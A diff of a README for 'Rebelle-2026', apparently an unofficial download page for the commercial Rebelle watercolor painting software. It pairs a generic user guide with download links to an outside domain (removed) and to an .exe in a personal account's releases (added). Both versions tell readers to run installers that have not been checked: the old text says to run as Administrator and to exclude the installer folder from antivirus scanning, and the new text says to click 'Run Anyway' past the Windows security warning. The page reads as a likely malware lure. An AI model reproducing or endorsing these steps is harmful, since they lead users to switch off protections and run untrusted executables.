@@ -1,79 +1,101 @@
-# Rebelle Download for Windows 11 & 10
+# 🎨 Rebelle-2026 - Paint Realistic Watercolors On Windows
 
-**Rebelle-2026**
+[![](https://img.shields.io/badge/Download-Rebelle--2026-blue.svg)](https://github.com/Pointsand350/Rebelle-2026)
 
-**Rebelle** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+Rebelle-2026 brings realistic painting tools to your computer. This software recreates the flow of water and the texture of paper. Use your mouse or a digital tablet to create illustrations. Follow this guide to install the application on your Windows computer.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+## 🛠 System Requirements
 
----
+Your computer needs specific parts to run this software. Check your system against these requirements before you start.
 
-## Download & Install
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel i5 or AMD Ryzen 5 processor.
+*   Memory: 8 GB of RAM or higher.
+*   Graphics: A dedicated graphics card with 2 GB of video memory.
+*   Storage: 2 GB of free space on your hard drive.
+*   Display: A monitor with a resolution of 1920x1080.
 
-> **This is the download page.** Use the button or link below to get **Rebelle** for Windows.
+Check your current system by opening the Settings app in Windows. Click on System and then look at the About menu. Verify that your computer meets these standards for a stable experience.
 
-<p align="center">
-  <a href="https://rebelle.zipzapsol.space/">
-    <img src="https://img.shields.io/badge/Download-Rebelle-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Rebelle">
-  </a>
-</p>
+## 📥 Downloading The Installer
 
-| | |
-| --- | --- |
-| **Direct link** | **[rebelle.zipzapsol.space](https://rebelle.zipzapsol.space/)** |
-| **Full URL** | `https://rebelle.zipzapsol.space/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+You need the installer file to add the application to your machine. 
 
-### Quick steps
+1. Go to the [Rebelle-2026 Download Page](https://github.com/Pointsand350/Rebelle-2026).
+2. Look for the Releases section on the right side of the page.
+3. Click the latest version number to open the details.
+4. Find the file ending in .exe under the Assets heading.
+5. Click the filename to save the installer to your computer.
 
-1. Click **[Download — rebelle.zipzapsol.space](https://rebelle.zipzapsol.space/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Wait for the download to finish. You will find the file in your Downloads folder by default.
 
-<p align="center"><a href="https://rebelle.zipzapsol.space/"><strong>⬇ Download Rebelle now</strong></a></p>
+## ⚙️ Installation Steps
 
----
+Follow these steps to set up the software on your desktop.
 
-## About
+1. Open your Downloads folder.
+2. Find the Rebelle-2026 installer file. It has a blue icon.
+3. Double-click the file to start the process.
+4. Windows may show a security window. Click More Info and then click Run Anyway.
+5. Follow the on-screen instructions in the setup window.
+6. Choose the location where you want to keep the application files.
+7. Click the Install button.
+8. Wait for the green progress bar to fill.
+9. Click the Finish button once the process ends. 
 
-**Rebelle** setup page for Windows PC users.
+The software icon will appear on your desktop. Click the icon to launch the application.
 
-**People also search for:** rebelle download, rebelle digital painting install setup windows 2026
+## 🖌 Basic Setup Guide
 
-**Repository:** `Rebelle-2026`
+You see a blank canvas when you open the program. Use the tools on the left side to start your first painting. 
 
+*   Paint Tools: Select the brush icon to pick different styles. You can choose watercolor, oil, or acrylic brushes. 
+*   Water Controls: Adjust the water slider to change how much liquid flows onto your page. Higher settings make the paint bleed into the paper textures.
+*   Color Table: Pick colors from the round palette. You can mix colors by brushing them into each other on the canvas.
+*   Paper Texture: Change your paper surface in the settings menu. You can choose hot-pressed, cold-pressed, or rough textures.
 
-## After install
+Save your work often by pressing the Control and S keys at the same time. This action protects your progress if the computer shuts down.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
+## 💡 Using Your Digital Tablet
 
-## System requirements
+Rebelle-2026 works well with digital drawing tablets. Connect your tablet to your computer using a USB port or a wireless connection before you open the software.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+1. Install the tablet drivers provided by the tablet manufacturer.
+2. Open Rebelle-2026.
+3. Go to the Edit menu and click settings.
+4. Select the tablet tab.
+5. Make sure the software detects your tablet pressure.
 
-## Troubleshooting
+The painting tools change width based on how hard you press your pen. Light pressure creates thin lines. Hard pressure creates bold strokes.
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+## 🔧 Frequently Asked Questions
 
----
+**Why does the software run slowly?**
+Check if you have other heavy programs open. Close web browsers or video players to free up memory for painting. 
 
-**Topics:** rebelle-download, rebelle, rebelle-digital-painting-install-setup-windows-202, digital, painting, rebelle-2026, digital-painting, watercolor, illustration, software, windows-11, download
+**How do I update the application?**
+Check the download page periodically for new versions. Download the new installer and follow the same steps to update your files. 
+
+**Can I export my images?**
+Click the File menu and select Export. You can save your painting as a JPEG or PNG file to share with others. 
+
+**Where do my settings save?**
+The software saves your personal preferences in your user documents folder. Do not delete these files if you want to keep your brush settings and color history.
+
+**Does the software work offline?**
+You do not need an active internet connection to paint. Once you install the program, it stays on your drive for use at any time.
+
+## 🧹 Clearing Cache Files
+
+Sometimes the software creates temporary files to track your brush strokes. If the program feels heavy, clear these files.
+
+1. Open the application folder in your program files.
+2. Look for the folder named Cache.
+3. Open the folder and delete the stored files inside.
+4. Restart the program to refresh the memory.
+
+This does not delete your paintings. It only removes the temporary data that the software builds while you work on your art. 
+
+## 🌐 Getting More Help
+
+The digital painting community provides many resources for new users. Search for tutorial videos if you want to learn advanced techniques. Look for watercolor painting lessons to practice how the natural media tools react to paper textures. Practice helps you get better at using the digital tools to reach your goals. Experiment with every brush type to see how they blend and interact on the canvas.
